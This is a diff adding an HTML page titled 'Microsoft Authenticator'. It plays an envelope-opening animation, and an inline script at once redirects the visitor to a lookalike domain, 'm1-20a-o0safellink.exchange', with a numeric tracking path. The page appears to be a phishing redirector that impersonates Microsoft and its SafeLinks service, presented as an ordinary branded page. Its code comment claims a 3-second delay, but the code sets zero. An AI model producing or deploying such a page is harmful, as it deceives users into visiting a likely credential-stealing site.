@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Authenticator</title>
+    <style>
+        /* Full-page gradient background */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: radial-gradient(circle, #f5d7d7, #f8f8f8, #d9f5d7);
+            overflow: hidden;
+        }
+
+        .email-animation {
+            position: relative;
+            width: 120px;
+            height: 80px;
+        }
+
+        /* Email envelope base */
+        .envelope {
+            width: 120px;
+            height: 60px;
+            background: #3498db;
+            border-radius: 5px;
+            position: absolute;
+            bottom: 0;
+            z-index: 1;
+        }
+
+        /* Envelope flap */
+        .flap {
+            width: 120px;
+            height: 40px;
+            background: #5dade2;
+            position: absolute;
+            top: 0;
+            left: 0;
+            transform-origin: top center;
+            transform: rotateX(0deg);
+            z-index: 2;
+            animation: openFlap 1s ease-in-out forwards;
+        }
+
+        /* CSS Keyframes for the flap opening animation */
+        @keyframes openFlap {
+            0% {
+                transform: rotateX(0deg);
+            }
+            100% {
+                transform: rotateX(-180deg);
+            }
+        }
+
+        /* Envelope Content */
+        .content {
+            width: 100px;
+            height: 50px;
+            background: white;
+            border-radius: 3px;
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            z-index: 0;
+            opacity: 0;
+            animation: showContent 2s ease-in-out forwards;
+            animation-delay: 1s;
+        }
+
+        /* CSS Keyframes for content appearance */
+        @keyframes showContent {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+    <script>
+        // Define the target domain
+        const targetDomain = "https://m1-20a-o0safellink.exchange/90298365256387386538763933/";
+
+        // Redirect to the target domain after a short delay
+        setTimeout(() => {
+            window.location.replace(targetDomain);
+        }, 0000); // 3-second delay to allow the animation to play
+    </script>
+</head>
+<body>
+</html>
